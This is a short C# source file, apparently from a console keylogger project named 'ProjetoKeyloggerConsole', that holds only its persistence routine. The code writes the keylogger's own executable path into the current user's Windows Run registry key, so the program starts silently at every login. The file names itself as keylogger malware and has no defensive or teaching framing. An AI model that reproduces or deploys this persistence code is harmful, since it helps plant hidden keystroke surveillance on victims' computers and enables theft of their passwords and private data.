using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ProjetoKeyloggerConsole.Entities
{
    internal class Registro
    {
        public static void Inicializar()
        {
            RegistryKey? key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            string directory = AppDomain.CurrentDomain.BaseDirectory + "\\ProjetoKeyloggerConsole.exe";
            key.SetValue("ProjetoKeyloggerConsole", directory);
            key.Close();
        }
    }
}
